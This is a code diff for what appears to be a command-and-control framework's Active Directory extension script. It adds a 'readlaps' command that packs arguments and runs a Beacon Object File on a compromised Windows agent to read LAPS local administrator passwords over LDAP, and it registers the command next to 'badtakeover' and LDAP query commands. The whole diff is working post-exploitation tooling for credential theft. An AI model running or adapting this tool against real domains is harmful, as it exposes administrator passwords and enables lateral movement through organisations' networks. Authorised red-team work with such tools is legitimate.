@@ -50,6 +50,78 @@ cmd_badtakeover.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) 
 
 
 
+/// ReadLAPS
+
+
+var cmd_readlaps = ax.create_command("readlaps", "Read LAPS password for a computer", "readlaps -dc dc01.domain.local -target WINCLIENT");
+cmd_readlaps.addArgFlagString("-dc", "dc", "Target domain controller (e.g., 'dc01.domain.local'). Hostname preferred over IP for LDAP.", "");
+cmd_readlaps.addArgFlagString("-dn", "dn", "Root DN (e.g., 'DC=domain,DC=local'). If not specified, derived from agent domain.", "");
+cmd_readlaps.addArgFlagString("-target", "target", "Target computer sAMAccountName (e.g., 'WINCLIENT$')", "");
+cmd_readlaps.addArgFlagString("-target-dn", "target_dn", "Target computer Distinguished Name (e.g., 'CN=WINCLIENT,OU=Computers,DC=domain,DC=local')", "");
+cmd_readlaps.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let dc        = parsed_json["dc"];
+    let dn        = parsed_json["dn"];
+    let target    = parsed_json["target"];
+    let target_dn = parsed_json["target_dn"];
+
+    if (!target && !target_dn) {
+        ax.console_message(id, "Error: Either -target (sAMAccountName) or -target-dn (Distinguished Name) must be specified", "error")
+        return;
+    }
+
+    if (target && target_dn) {
+        ax.console_message(id, "Error: Cannot specify both -target and -target-dn", "error");
+        return;
+    }
+
+    // If -dn not specified, derive from agent domain
+    if (!dn || dn === "") {
+        let domain = ax.agent_info(id, "domain")
+        if (domain) {
+            let parts = domain.split(".");
+            dn = parts.map(part => "DC=" + part).join(",");
+            ax.console_message(id, "Detected DN from agent domain: " + dn, "info");
+        } else {
+            ax.console_message(id, "Error", "error", "Could not auto-detect DN. Agent domain not available. Please specify -dn manually.");
+            return;
+        }
+    }
+
+    // Strip quotes from target values if present
+    if (dc) {
+        dc = dc.replace(/^['"]|['"]$/g, '');
+    }
+    if (target) {
+        target = target.replace(/^['"]|['"]$/g, '');
+    }
+    if (target_dn) {
+        target_dn = target_dn.replace(/^['"]|['"]$/g, '');
+    }
+
+    // Build the LDAP search filter
+    let searchFilter = "";
+    if (target) {
+        // Ensure target ends with $ for computer accounts if not already present
+        let computerName = target;
+        if (!computerName.endsWith("$")) {
+            computerName = computerName + "$";
+        }
+        searchFilter = "(&(objectClass=computer)(sAMAccountName=" + computerName + "))";
+    } else {
+        searchFilter = "(&(objectClass=computer)(distinguishedName=" + target_dn + "))";
+    }
+    ax.console_message(id, "LDAP search filter: " + searchFilter, "info");
+
+    let bof_params = ax.bof_pack("cstr,cstr,cstr", [dc, dn, searchFilter]);
+    let bof_path = ax.script_dir() + "_bin/readlaps." + ax.arch(id) + ".o";
+    let message = "BOF implementation: readlaps";
+
+    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
+});
+
+
+
+
 /// LDAPsearch
 
 
@@ -138,7 +210,7 @@ cmd_ldapq.addSubCommands([_cmd_ldapq_computers]);
 
 
 
-var group_exec = ax.create_commands_group("AD-BOF", [cmd_adwssearch, cmd_badtakeover, cmd_ldapsearch, cmd_ldapq]);
+var group_exec = ax.create_commands_group("AD-BOF", [cmd_adwssearch, cmd_badtakeover, cmd_readlaps, cmd_ldapsearch, cmd_ldapq]);
 ax.register_commands_group(group_exec, ["beacon", "gopher"], ["windows"], []);
 
 
